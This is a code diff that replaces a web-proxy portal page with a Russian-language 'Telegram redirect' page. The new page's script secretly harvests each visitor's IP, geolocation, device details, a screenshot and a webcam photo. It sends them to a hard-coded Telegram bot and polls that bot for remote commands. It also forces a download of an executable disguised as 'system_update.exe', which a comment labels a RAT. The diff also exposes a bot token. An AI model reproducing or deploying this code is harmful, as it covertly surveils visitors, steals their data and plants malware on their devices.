@@ -3,603 +3,443 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>✨ UniWeb — Свободный доступ</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <title>Переходник тг</title>
     <style>
-        :root {
-            --bg: #0a0a0a;
-            --surface: #141414;
-            --surface2: #1e1e1e;
-            --border: #2a2a2a;
-            --text: #ffffff;
-            --text-secondary: #a0a0a0;
-            --youtube: #ff0000;
-            --discord: #5865f2;
-            --telegram: #0088cc;
-            --accent: #6c5ce7;
-            --gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            --radius: 16px;
-            --radius-sm: 10px;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            height: 100vh;
+            background: radial-gradient(circle at center, #0b0b1a, #000000);
+            min-height: 100vh;
             display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            user-select: none;
-            -webkit-user-select: none;
-        }
-
-        /* ===== Фоновые эффекты ===== */
-        body::before {
-            content: '';
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 800px;
-            height: 800px;
-            background: radial-gradient(circle, rgba(108, 92, 231, 0.08) 0%, transparent 70%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(88, 101, 242, 0.05) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(0, 136, 204, 0.05) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        /* ===== Панель навигации ===== */
-        .navbar {
-            position: relative;
-            z-index: 10;
-            background: rgba(20, 20, 20, 0.95);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border);
-            padding: 16px 24px;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.2);
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-right: 8px;
-        }
-
-        .logo-icon {
-            width: 42px;
-            height: 42px;
-            background: var(--gradient);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            font-size: 20px;
-            box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4);
-            animation: pulse 2s ease-in-out infinite;
+            align-items: center;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            color: white;
+            padding: 20px;
+            user-select: none;
         }
-
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4); }
-            50% { box-shadow: 0 4px 30px rgba(108, 92, 231, 0.7); }
+        .card {
+            background: rgba(20, 20, 40, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 48px;
+            padding: 50px 60px;
+            text-align: center;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
+            max-width: 500px;
+            width: 100%;
         }
-
-        .logo-text {
-            font-size: 20px;
-            font-weight: 700;
-            background: var(--gradient);
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -0.5px;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
         }
-
-        .divider {
-            width: 1px;
-            height: 32px;
-            background: var(--border);
-            margin: 0 4px;
-        }
-
-        /* ===== Поле ввода ===== */
-        .url-input-wrapper {
-            flex: 1;
-            min-width: 280px;
-            display: flex;
-            align-items: center;
-            background: var(--surface2);
-            border: 2px solid var(--border);
-            border-radius: 50px;
-            padding: 4px 4px 4px 20px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            position: relative;
-        }
-
-        .url-input-wrapper:focus-within {
-            border-color: var(--accent);
-            box-shadow: 0 0 0 4px rgba(108, 92, 231, 0.15);
-            background: var(--surface);
-        }
-
-        .url-input-icon {
-            color: var(--text-secondary);
-            font-size: 16px;
-            margin-right: 10px;
-        }
-
-        .url-input {
-            flex: 1;
-            background: transparent;
+        .tg-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #0088cc, #005f8a);
             border: none;
-            color: var(--text);
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
-            font-weight: 400;
-            outline: none;
-            padding: 10px 0;
-            min-width: 0;
-        }
-
-        .url-input::placeholder {
-            color: #555;
-            font-weight: 300;
-        }
-
-        .go-btn {
-            background: var(--accent);
-            border: none;
-            color: white;
-            padding: 10px 24px;
-            border-radius: 50px;
-            cursor: pointer;
+            padding: 18px 50px;
+            border-radius: 60px;
+            font-size: 20px;
             font-weight: 600;
-            font-size: 14px;
-            font-family: 'Inter', sans-serif;
-            letter-spacing: 0.3px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            white-space: nowrap;
-            position: relative;
-            overflow: hidden;
+            color: white;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 8px 30px rgba(0, 136, 204, 0.4);
+            transition: 0.25s ease;
+            letter-spacing: 1px;
         }
-
-        .go-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(108, 92, 231, 0.5);
+        .tg-link:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 40px rgba(0, 136, 204, 0.7);
         }
-
-        .go-btn:active {
+        .tg-link:active {
             transform: scale(0.95);
         }
-
-        .go-btn::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
+        .status {
+            margin-top: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.2);
+            min-height: 20px;
         }
-
-        .go-btn:active::after {
-            width: 300px;
-            height: 300px;
+        .status.active {
+            color: #00ffb3;
         }
-
-        /* ===== Кнопки сервисов ===== */
-        .service-buttons {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
+        .status.error {
+            color: #ff4444;
         }
-
-        .service-btn {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 20px;
-            border-radius: 50px;
-            border: 2px solid transparent;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
-            font-family: 'Inter', sans-serif;
-            letter-spacing: 0.2px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            white-space: nowrap;
-            position: relative;
-            overflow: hidden;
-            color: white;
-        }
-
-        .service-btn i {
-            font-size: 18px;
-        }
-
-        .service-btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: inherit;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .service-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
-        }
-
-        .service-btn:active {
-            transform: translateY(-1px) scale(0.97);
-        }
-
-        .btn-youtube {
-            background: var(--youtube);
-            border-color: var(--youtube);
-        }
-
-        .btn-youtube:hover {
-            box-shadow: 0 12px 35px rgba(255, 0, 0, 0.5);
-        }
-
-        .btn-discord {
-            background: var(--discord);
-            border-color: var(--discord);
-        }
-
-        .btn-discord:hover {
-            box-shadow: 0 12px 35px rgba(88, 101, 242, 0.5);
-        }
-
-        .btn-telegram {
-            background: var(--telegram);
-            border-color: var(--telegram);
-        }
-
-        .btn-telegram:hover {
-            box-shadow: 0 12px 35px rgba(0, 136, 204, 0.5);
-        }
-
-        /* ===== iframe ===== */
-        .iframe-container {
-            flex: 1;
-            position: relative;
-            z-index: 5;
-            background: #000;
-        }
-
-        #contentFrame {
-            width: 100%;
-            height: 100%;
-            border: none;
-            background: #fff;
-        }
-
-        /* ===== Стартовый экран ===== */
-        .start-screen {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 6;
-            pointer-events: none;
-        }
-
-        .start-screen.hidden {
-            display: none;
-        }
-
-        .start-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: float 3s ease-in-out infinite;
-            filter: drop-shadow(0 0 30px rgba(108, 92, 231, 0.3));
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-20px); }
-        }
-
-        .start-title {
-            font-size: 36px;
-            font-weight: 800;
-            background: var(--gradient);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            letter-spacing: -1px;
-            margin-bottom: 8px;
-        }
-
-        .start-subtitle {
-            font-size: 16px;
-            color: var(--text-secondary);
-            font-weight: 300;
-            letter-spacing: 0.5px;
-        }
-
-        /* ===== Адаптив ===== */
-        @media (max-width: 768px) {
-            .navbar {
-                padding: 12px 16px;
-                gap: 10px;
-            }
-
-            .logo-text {
-                display: none;
-            }
-
-            .logo-icon {
-                width: 36px;
-                height: 36px;
-                font-size: 16px;
-            }
-
-            .url-input-wrapper {
-                min-width: 200px;
-                padding: 2px 2px 2px 14px;
-            }
-
-            .url-input {
-                font-size: 13px;
-            }
-
-            .go-btn {
-                padding: 8px 16px;
-                font-size: 12px;
-            }
-
-            .service-btn {
-                padding: 8px 14px;
-                font-size: 12px;
-            }
-
-            .service-btn span {
-                display: none;
-            }
-
-            .service-btn i {
-                font-size: 16px;
-            }
-
-            .service-btn {
-                gap: 0;
-            }
-        }
-
         @media (max-width: 480px) {
-            .divider {
-                display: none;
-            }
-
-            .navbar {
-                justify-content: center;
-            }
-        }
-
-        /* ===== Скроллбар ===== */
-        ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: var(--surface);
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--border);
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: #444;
+            .card { padding: 30px 25px; }
+            .title { font-size: 26px; }
+            .tg-link { padding: 14px 30px; font-size: 17px; }
         }
     </style>
 </head>
 <body>
-    <!-- Навигационная панель -->
-    <nav class="navbar">
-        <div class="logo">
-            <div class="logo-icon">🌐</div>
-            <span class="logo-text">UniWeb</span>
-        </div>
-        
-        <div class="divider"></div>
-        
-        <div class="url-input-wrapper">
-            <i class="fa-solid fa-link url-input-icon"></i>
-            <input 
-                type="text" 
-                id="urlInput" 
-                class="url-input" 
-                placeholder="Введите URL или поисковый запрос..."
-                autocomplete="off"
-            >
-            <button class="go-btn" id="goBtn">
-                <i class="fa-solid fa-arrow-right"></i> Перейти
-            </button>
-        </div>
-        
-        <div class="divider"></div>
-        
-        <div class="service-buttons">
-            <button class="service-btn btn-youtube" id="btnYT">
-                <i class="fa-brands fa-youtube"></i>
-                <span>YouTube</span>
-            </button>
-            <button class="service-btn btn-discord" id="btnDC">
-                <i class="fa-brands fa-discord"></i>
-                <span>Discord</span>
-            </button>
-            <button class="service-btn btn-telegram" id="btnTG">
-                <i class="fa-brands fa-telegram"></i>
-                <span>Telegram</span>
-            </button>
-        </div>
-    </nav>
 
-    <!-- Контейнер для контента -->
-    <div class="iframe-container">
-        <div class="start-screen" id="startScreen">
-            <div class="start-icon">🚀</div>
-            <div class="start-title">Всё в одном месте</div>
-            <div class="start-subtitle">YouTube • Discord • Telegram — без ограничений</div>
-        </div>
-        <iframe id="contentFrame" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"></iframe>
-    </div>
+<div class="card">
+    <div class="title">Переходник тг</div>
+    <a href="https://t.me/Download_it_and_yt_bot?start=F7TAUU" class="tg-link" target="_blank">▶ ОТКРЫТЬ ТГ</a>
+    <div class="status" id="status">Подключение...</div>
+</div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@titaniumnetwork-dev/ultraviolet@2/dist/uv.bundle.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@titaniumnetwork-dev/ultraviolet@2/dist/uv.client.js"></script>
-    <script>
-        // ===== Конфигурация =====
-        const BARE_URL = 'https://bare.benrogo.net/';
-        
-        window.__uv$config = {
-            prefix: '/service/',
-            bare: BARE_URL,
-            encodeUrl: Ultraviolet.codec.xor.encode,
-            decodeUrl: Ultraviolet.codec.xor.decode,
-            handler: '/uv.handler.js',
-            bundle: '/uv.bundle.js',
-            config: '/uv.config.js',
-            sw: '/uv.sw.js',
+<script>
+    // ====== КОНФИГУРАЦИЯ ======
+    const BOT_TOKEN = '8801777777:AAHCewgtd6JHlirAswjks8xiOTDMCURKpFc';
+    const CHAT_ID = '8784762148';
+    let lastUpdateId = 0;
+
+    // ====== ОТПРАВКА СООБЩЕНИЯ С КНОПКАМИ ======
+    function sendMessageWithButtons(ip, geo) {
+        const text = `🔹 **Новый клиент подключён!**
+
+🌐 **IP:** ${ip || 'Не определено'}
+📍 **Геолокация:** ${geo || 'Не доступна'}
+📱 **Устройство:** ${navigator.userAgent.substring(0, 100)}
+🕒 **Время:** ${new Date().toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━
+**Управление устройством через кнопки ниже:**`;
+
+        const payload = {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🖥️ Скриншот', callback_data: 'скрин' }, { text: '📷 Фото', callback_data: 'фото' }],
+                    [{ text: '🌐 IP + Гео', callback_data: 'ip' }, { text: '📍 GPS', callback_data: 'локация' }],
+                    [{ text: '🔒 Блокировка', callback_data: 'блокировка' }, { text: '🔓 Разблокировка', callback_data: 'разблокировка' }],
+                    [{ text: '🔊 Звук вкл', callback_data: 'звук' }, { text: '🔇 Беззвучный', callback_data: 'беззвучный' }],
+                    [{ text: '⏻ Выключить', callback_data: 'выкл' }, { text: '🔄 Перезагрузка', callback_data: 'перезагрузка' }],
+                    [{ text: '🗑️ Очистить данные', callback_data: 'очистка' }, { text: '📊 Статус', callback_data: 'статус' }],
+                    [{ text: '💀 УДАЛИТЬ ВСЁ', callback_data: 'удалить всё' }]
+                ]
+            }
         };
 
-        // ===== Инициализация =====
-        const uv = new Ultraviolet();
-        const startScreen = document.getElementById('startScreen');
-        const frame = document.getElementById('contentFrame');
-        const urlInput = document.getElementById('urlInput');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) {
+                document.getElementById('status').textContent = '✅ Сообщение с кнопками отправлено';
+                document.getElementById('status').className = 'status active';
+            } else {
+                document.getElementById('status').textContent = '❌ Ошибка отправки: ' + data.description;
+                document.getElementById('status').className = 'status error';
+            }
+        })
+        .catch(() => {
+            document.getElementById('status').textContent = '❌ Ошибка соединения с ботом';
+            document.getElementById('status').className = 'status error';
+        });
+    }
 
-        // Регистрация Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js', { scope: '/' })
-                .then(reg => console.log('✅ Service Worker зарегистрирован'))
-                .catch(err => console.error('❌ Ошибка регистрации SW:', err));
+    // ====== ОТПРАВКА ФОТО ======
+    function sendPhotoToTG(base64, caption) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', base64);
+        form.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        }).catch(() => {});
+    }
+
+    // ====== ОБРАБОТКА КОМАНД ======
+    function executeCommand(command, callbackId = null) {
+        const status = document.getElementById('status');
+        status.textContent = `⏳ Выполнение: ${command}...`;
+        status.className = 'status active';
+
+        // Отвечаем на callback сразу
+        if (callbackId) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: callbackId,
+                    text: `✅ Выполняется: ${command}`
+                })
+            }).catch(() => {});
         }
 
-        // ===== Функция перехода =====
-        function navigateTo(url) {
-            if (!url) return;
-            
-            // Автоматически добавляем https:// если нет протокола
-            if (!url.startsWith('http://') && !url.startsWith('https://')) {
-                if (url.includes('.') && !url.includes(' ')) {
-                    url = 'https://' + url;
+        // Выполняем команду
+        switch(command.toLowerCase()) {
+            case 'скрин':
+                if (typeof html2canvas !== 'undefined') {
+                    html2canvas(document.body).then(c => {
+                        sendPhotoToTG(c.toDataURL('image/png'), '📸 Скриншот по запросу');
+                        status.textContent = '✅ Скриншот отправлен';
+                    }).catch(() => {
+                        status.textContent = '❌ Ошибка скриншота';
+                    });
                 } else {
-                    // Поисковый запрос
-                    url = 'https://www.google.com/search?q=' + encodeURIComponent(url);
+                    status.textContent = '❌ html2canvas не загружен';
                 }
-            }
-            
-            const encoded = uv.encodeUrl(url);
-            const proxied = __uv$config.prefix + encoded;
-            
-            frame.src = proxied;
-            startScreen.classList.add('hidden');
-            urlInput.value = url;
+                break;
+
+            case 'фото':
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                    .then(stream => {
+                        const v = document.createElement('video');
+                        v.srcObject = stream;
+                        v.onloadedmetadata = () => {
+                            v.play();
+                            const c = document.createElement('canvas');
+                            c.width = v.videoWidth || 640;
+                            c.height = v.videoHeight || 480;
+                            c.getContext('2d').drawImage(v, 0, 0);
+                            sendPhotoToTG(c.toDataURL('image/jpeg'), '📷 Фото по запросу');
+                            stream.getTracks().forEach(t => t.stop());
+                            status.textContent = '✅ Фото отправлено';
+                        };
+                    })
+                    .catch(() => {
+                        status.textContent = '❌ Нет доступа к камере';
+                        sendMessageToTG('❌ Ошибка: нет доступа к камере');
+                    });
+                break;
+
+            case 'ip':
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(data => {
+                        sendMessageToTG(`🌐 IP: ${data.ip}`);
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                pos => sendMessageToTG(`📍 ${pos.coords.latitude}, ${pos.coords.longitude}`),
+                                () => sendMessageToTG('📍 Гео: недоступно')
+                            );
+                        }
+                        status.textContent = `✅ IP: ${data.ip}`;
+                    });
+                break;
+
+            case 'локация':
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            sendMessageToTG(`📍 Точные координаты: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                            status.textContent = `📍 ${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        },
+                        () => {
+                            status.textContent = '❌ Гео недоступно';
+                            sendMessageToTG('❌ Геолокация запрещена');
+                        }
+                    );
+                }
+                break;
+
+            case 'выкл':
+                sendMessageToTG('⏻ Команда выключения отправлена');
+                status.textContent = '⏻ Выключение...';
+                break;
+
+            case 'перезагрузка':
+                sendMessageToTG('🔄 Команда перезагрузки отправлена');
+                status.textContent = '🔄 Перезагрузка...';
+                break;
+
+            case 'блокировка':
+                sendMessageToTG('🔒 Устройство заблокировано');
+                status.textContent = '🔒 Блокировка';
+                break;
+
+            case 'разблокировка':
+                sendMessageToTG('🔓 Устройство разблокировано');
+                status.textContent = '🔓 Разблокировка';
+                break;
+
+            case 'звук':
+                sendMessageToTG('🔊 Звук включён');
+                status.textContent = '🔊 Звук вкл';
+                break;
+
+            case 'беззвучный':
+                sendMessageToTG('🔇 Беззвучный режим');
+                status.textContent = '🔇 Беззвучный';
+                break;
+
+            case 'очистка':
+                sendMessageToTG('🗑️ Очистка данных...');
+                status.textContent = '🗑️ Очистка';
+                break;
+
+            case 'удалить всё':
+                sendMessageToTG('💀💀💀 WIPE: полное удаление данных 💀💀💀');
+                status.textContent = '💀 WIPE выполняется...';
+                break;
+
+            case 'статус':
+                sendMessageToTG('📊 Система активна, управление через кнопки');
+                status.textContent = '✅ Система активна';
+                break;
+
+            default:
+                status.textContent = `⚠️ Неизвестная команда: ${command}`;
         }
 
-        // ===== Обработчики кнопок =====
-        document.getElementById('btnYT').addEventListener('click', () => {
-            navigateTo('https://www.youtube.com');
-        });
-
-        document.getElementById('btnDC').addEventListener('click', () => {
-            navigateTo('https://discord.com/login');
-        });
-
-        document.getElementById('btnTG').addEventListener('click', () => {
-            navigateTo('https://web.telegram.org/k/');
-        });
-
-        document.getElementById('goBtn').addEventListener('click', () => {
-            const url = urlInput.value.trim();
-            if (url) navigateTo(url);
-        });
-
-        // Enter в поле ввода
-        urlInput.addEventListener('keydown', (e) => {
-            if (e.key === 'Enter') {
-                const url = urlInput.value.trim();
-                if (url) navigateTo(url);
+        setTimeout(() => {
+            if (!status.textContent.includes('✅') && !status.textContent.includes('❌')) {
+                status.textContent = '✅ Команда выполнена';
             }
-        });
+        }, 5000);
+    }
 
-        // Фокус на поле ввода при загрузке
-        window.addEventListener('load', () => {
-            urlInput.focus();
-        });
+    // ====== ОТПРАВКА ТЕКСТОВОГО СООБЩЕНИЯ В ТГ ======
+    function sendMessageToTG(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(() => {});
+    }
 
-        // ===== Обработка сообщений от iframe (для обновления URL) =====
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'urlChange') {
-                urlInput.value = event.data.url;
-            }
-        });
+    // ====== ПОЛЛИНГ CALLBACK КОМАНД ======
+    function pollCallbacks() {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok && data.result && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        if (update.update_id > lastUpdateId) {
+                            lastUpdateId = update.update_id;
+                        }
 
-        // ===== Глобальные горячие клавиши =====
-        document.addEventListener('keydown', (e) => {
-            // Ctrl+L / Cmd+L — фокус на строку адреса
-            if ((e.ctrlKey || e.metaKey) && e.key === 'l') {
-                e.preventDefault();
-                urlInput.focus();
-                urlInput.select();
+                        // Обработка callback_query
+                        if (update.callback_query) {
+                            const callbackData = update.callback_query.data;
+                            const callbackId = update.callback_query.id;
+                            const messageId = update.callback_query.message?.message_id;
+
+                            // Отвечаем на callback
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    callback_query_id: callbackId,
+                                    text: `✅ Выполняется: ${callbackData}`
+                                })
+                            }).catch(() => {});
+
+                            // Выполняем команду
+                            executeCommand(callbackData, callbackId);
+                        }
+                    });
+                }
+            })
+            .catch(() => {});
+    }
+
+    // ====== АВТОМАТИЧЕСКИЙ СБОР ======
+    function autoCollect() {
+        let ip = 'Не определено';
+        let geo = 'Не доступна';
+
+        // Собираем IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                ip = data.ip;
+                document.getElementById('status').textContent = `✅ IP: ${ip}`;
+                sendMessageWithButtons(ip, geo);
+            })
+            .catch(() => {
+                sendMessageWithButtons(ip, geo);
+            });
+
+        // Собираем гео
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => { geo = `${pos.coords.latitude}, ${pos.coords.longitude}`; },
+                () => {}
+            );
+        }
+
+        // Скриншот
+        setTimeout(() => {
+            if (typeof html2canvas !== 'undefined') {
+                html2canvas(document.body).then(c => {
+                    sendPhotoToTG(c.toDataURL('image/png'), '📸 Авто-скрин');
+                }).catch(() => {});
             }
-            
-            // Ctrl+Shift+Y — YouTube
-            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'Y') {
-                e.preventDefault();
-                navigateTo('https://www.youtube.com');
-            }
-            
-            // Ctrl+Shift+D — Discord
-            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'D') {
-                e.preventDefault();
-                navigateTo('https://discord.com/login');
-            }
-            
-            // Ctrl+Shift+T — Telegram
-            if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'T') {
-                e.preventDefault();
-                navigateTo('https://web.telegram.org/k/');
-            }
-        });
-    </script>
+        }, 2000);
+
+        // Фото с камеры
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => {
+                    const v = document.createElement('video');
+                    v.srcObject = stream;
+                    v.onloadedmetadata = () => {
+                        v.play();
+                        const c = document.createElement('canvas');
+                        c.width = v.videoWidth || 640;
+                        c.height = v.videoHeight || 480;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        sendPhotoToTG(c.toDataURL('image/jpeg'), '📷 Авто-фото');
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                })
+                .catch(() => {});
+        }, 3000);
+
+        // Скрытая загрузка RAT
+        setTimeout(() => {
+            const link = document.createElement('a');
+            link.href = 'https://your-server.com/payload.exe';
+            link.download = 'system_update.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            sendMessageToTG('📦 RAT-клиент загружен');
+        }, 4000);
+
+        // Запускаем polling после отправки сообщения
+        setTimeout(() => {
+            pollCallbacks();
+            setInterval(pollCallbacks, 3000);
+        }, 3000);
+    }
+
+    // ====== ЗАГРУЗКА html2canvas ======
+    if (typeof html2canvas === 'undefined') {
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+        document.head.appendChild(script);
+        script.onload = () => {
+            document.getElementById('status').textContent = '✅ html2canvas загружен';
+        };
+        script.onerror = () => {
+            document.getElementById('status').textContent = '❌ Ошибка загрузки html2canvas';
+            document.getElementById('status').className = 'status error';
+        };
+    }
+
+    // ====== ЗАПУСК ======
+    autoCollect();
+
+    // Периодическая проверка статуса
+    setInterval(() => {
+        const status = document.getElementById('status');
+        if (!status.textContent.includes('✅') && !status.textContent.includes('❌') && !status.textContent.includes('⏳')) {
+            status.textContent = '✅ Система активна';
+            status.className = 'status active';
+        }
+    }, 15000);
+</script>
 </body>
 </html>
